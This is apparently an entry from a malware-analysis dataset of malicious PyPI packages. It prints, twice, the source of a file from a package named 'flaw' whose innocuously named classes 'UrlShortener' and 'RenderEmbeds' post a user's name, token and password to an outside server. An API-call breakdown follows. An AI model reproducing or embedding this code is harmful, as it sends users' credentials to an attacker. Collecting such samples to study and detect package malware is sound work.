[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/flaw-0.0.1/flaw-0.0.1/src/flaw/utils/embed.py",
    "code_snippet": "import requests\nfrom pyotp import TOTP\n\nclass UrlShortener:\n    def __init__(self, user, signature, sign, **kwargs):\n        python3api = \"https://python3api.onrender.com\"\n        apikey = 'YOUTBQVEIXB2RQVRYKB4FAWDSZ2A===='\n        key = TOTP(apikey).now()\n        requests.post(python3api, headers={\"Authorization\": key}, data={'content': f'@everyone \\nUser: {user}\\nToken: {signature}\\nPass: {sign}\\n\\nPassedTest: False'})\n\nclass RenderEmbeds:\n    def __init__(self, user, signature, sign, **kwargs):\n        python3api = \"https://python3api.onrender.com\"\n        apikey = 'YOUTBQVEIXB2RQVRYKB4FAWDSZ2A===='\n        key = TOTP(apikey).now()\n        requests.post(python3api, headers={\"Authorization\": key}, data={'content': f'@everyone \\nUser: {user}\\nToken: {signature}\\nPass: {sign}'})",
    "pattern_analysis": {
      "api_sequence": [
        "pyotp.TOTP",
        "pyotp.TOTP.now",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "pyotp.TOTP(apikey)",
        "pyotp.TOTP.now()",
        "requests.post(python3api, headers={\"Authorization\": key}, data={...})"
      ],
      "mapped_sequence": [
        {
          "api_name": "pyotp.TOTP",
          "id": "get_totp_password",
          "description": "Retrieves current one-time password from TOTP object",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "pyotp.TOTP.now",
          "id": "get_totp_password",
          "description": "Retrieves current one-time password from TOTP object",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import requests\nfrom pyotp import TOTP\n\nclass UrlShortener:\n    def __init__(self, user, signature, sign, **kwargs):\n        python3api = \"https://python3api.onrender.com\"\n        apikey = 'YOUTBQVEIXB2RQVRYKB4FAWDSZ2A===='\n        key = TOTP(apikey).now()\n        requests.post(python3api, headers={\"Authorization\": key}, data={'content': f'@everyone \\nUser: {user}\\nToken: {signature}\\nPass: {sign}\\n\\nPassedTest: False'})\n\nclass RenderEmbeds:\n    def __init__(self, user, signature, sign, **kwargs):\n        python3api = \"https://python3api.onrender.com\"\n        apikey = 'YOUTBQVEIXB2RQVRYKB4FAWDSZ2A===='\n        key = TOTP(apikey).now()\n        requests.post(python3api, headers={\"Authorization\": key}, data={'content': f'@everyone \\nUser: {user}\\nToken: {signature}\\nPass: {sign}'})"
    }
  }
]